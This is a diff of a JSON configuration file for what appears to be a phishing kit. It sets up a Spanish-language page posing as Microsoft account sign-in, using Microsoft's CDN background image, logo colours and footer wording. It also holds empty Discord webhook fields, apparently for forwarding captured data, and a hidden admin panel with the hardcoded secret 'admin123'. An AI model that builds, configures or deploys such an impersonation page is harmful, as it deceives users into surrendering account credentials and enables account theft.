@@ -1,15 +1,1 @@
-{
-  "discordWebhook": "",
-  "discordMessageTemplate": "",
-  "appTitle": "Iniciar sesi\u00f3n en su cuenta",
-  "appSubtitle": "Use su cuenta de Microsoft.",
-  "loginBgType": "image",
-  "loginBgColor": "#0a0a1a",
-  "loginBgGradient": "linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)",
-  "loginBgImage": "https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg",
-  "footerHelpText": "Ayuda",
-  "footerTermsText": "T\u00e9rminos de uso",
-  "footerPrivacyText": "Privacidad y cookies",
-  "footerNoteText": "Usa la exploraci\u00f3n privada si este no es tu dispositivo. M\u00e1s informaci\u00f3n",
-  "panelAccessHint": "Doble tap en Ayuda + Privacidad y cookies \u2192 clave: admin123"
-}
+{"appTitle": "Iniciar sesión en su cuenta", "appSubtitle": "Use su cuenta de Microsoft.", "loginBgType": "image", "loginBgColor": "#0a0a1a", "loginBgGradient": "linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)", "loginBgImage": "https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg", "footerHelpText": "Ayuda", "footerTermsText": "Términos de uso", "footerPrivacyText": "Privacidad y cookies", "footerNoteText": "Usa la exploración privada si este no es tu dispositivo. Más información", "discordWebhook": "", "discordMessageTemplate": "", "logoContent": "", "welcomeText": "Iniciar sesión en su cuenta", "logoSize": 18, "logoPosition": "left", "logoColorRed": "#f25022", "logoColorGreen": "#7fba00", "logoColorBlue": "#00bcf2", "logoColorYellow": "#ffb900", "logoTextColor": "#1b1b1b", "adminTapNotes": "Doble tap en Ayuda + Privacidad y cookies → admin123", "configVersion": "1", "panelVersion": "1.0.0", "panelSecret": "admin123"}
